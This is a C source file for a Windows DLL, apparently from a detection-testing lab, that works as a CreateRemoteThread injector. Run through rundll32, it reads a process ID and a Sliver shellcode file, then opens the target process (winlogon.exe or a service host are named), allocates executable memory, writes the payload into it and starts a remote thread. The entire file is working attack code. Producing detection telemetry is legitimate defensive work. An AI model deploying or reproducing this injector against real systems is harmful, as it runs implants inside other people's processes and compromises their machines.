/*
 * c0015_injector.c — minimal CreateRemoteThread injector used as the lab's loader
 *
 * Purpose in the lab: place a Sliver shellcode payload into a target process using the
 * CreateRemoteThread path, so the injection produces the Sysmon events the detection layer
 * expects (E10 handle request, E8 remote thread).
 *
 * The target PID is read from target.txt and the payload from D8B3.bin, both next to the DLL,
 * so the same module can be pointed at winlogon.exe or a service host without a rebuild.
 *
 * Loaded with: rundll32.exe c0015_injector.dll,Run
 * This keeps the source image of the injection equal to rundll32.exe.
 *
 * Log: C:\Users\Public\C0015\inject.log
 */
#include <windows.h>
#include <stdarg.h>
#include <stdlib.h>

#define DIR   L"C:\\Users\\Public\\C0015\\"
#define LOGF  L"C:\\Users\\Public\\C0015\\inject.log"
#define PIDF  L"C:\\Users\\Public\\C0015\\target.txt"
#define BINF  L"C:\\Users\\Public\\C0015\\D8B3.bin"

static void logf(const char *fmt, ...)
{
    char buf[512];
    va_list ap;
    HANDLE h;
    DWORD written = 0;
    int n;

    va_start(ap, fmt);
    n = wvsprintfA(buf, fmt, ap);
    va_end(ap);

    h = CreateFileW(LOGF, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                    OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        WriteFile(h, buf, (DWORD)n, &written, NULL);
        WriteFile(h, "\r\n", 2, &written, NULL);
        CloseHandle(h);
    }
}

static DWORD read_pid(void)
{
    HANDLE h;
    char buf[32] = {0};
    DWORD read = 0;

    h = CreateFileW(PIDF, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        logf("target.txt open failed err=%lu", GetLastError());
        return 0;
    }
    ReadFile(h, buf, sizeof(buf) - 1, &read, NULL);
    CloseHandle(h);
    return (DWORD)strtoul(buf, NULL, 10);
}

__declspec(dllexport) void Run(void)
{
    DWORD pid;
    HANDLE hProc, hFile, hThread;
    DWORD size, read = 0;
    LPVOID remote;
    SIZE_T written = 0;
    DWORD wait_rc;

    logf("=== injector start ===");

    pid = read_pid();
    if (pid == 0) {
        logf("no pid, abort");
        return;
    }
    logf("target pid=%lu", pid);

    hFile = CreateFileW(BINF, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        logf("payload open failed err=%lu", GetLastError());
        return;
    }
    size = GetFileSize(hFile, NULL);
    logf("payload size=%lu", size);

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        logf("OpenProcess failed err=%lu", GetLastError());
        CloseHandle(hFile);
        return;
    }
    logf("OpenProcess ok");

    remote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE,
                            PAGE_EXECUTE_READWRITE);
    if (!remote) {
        logf("VirtualAllocEx failed err=%lu", GetLastError());
        CloseHandle(hProc);
        CloseHandle(hFile);
        return;
    }
    logf("VirtualAllocEx ok addr=%p", remote);

    {
        LPVOID local = HeapAlloc(GetProcessHeap(), 0, size);
        if (!local) {
            logf("heap alloc failed");
            CloseHandle(hProc);
            CloseHandle(hFile);
            return;
        }
        ReadFile(hFile, local, size, &read, NULL);
        CloseHandle(hFile);

        if (!WriteProcessMemory(hProc, remote, local, size, &written)) {
            logf("WriteProcessMemory failed err=%lu", GetLastError());
            HeapFree(GetProcessHeap(), 0, local);
            CloseHandle(hProc);
            return;
        }
        logf("WriteProcessMemory ok bytes=%llu", (unsigned long long)written);
        HeapFree(GetProcessHeap(), 0, local);
    }

    hThread = CreateRemoteThread(hProc, NULL, 0,
                                 (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
    if (!hThread) {
        logf("CreateRemoteThread failed err=%lu", GetLastError());
        CloseHandle(hProc);
        return;
    }
    logf("CreateRemoteThread ok");

    wait_rc = WaitForSingleObject(hThread, 5000);
    logf("thread wait rc=%lu", wait_rc);

    CloseHandle(hThread);
    CloseHandle(hProc);
    logf("=== injector done ===");
}

BOOL APIENTRY DllMain(HMODULE m, DWORD r, LPVOID v)
{
    (void)m; (void)r; (void)v;
    return TRUE;
}

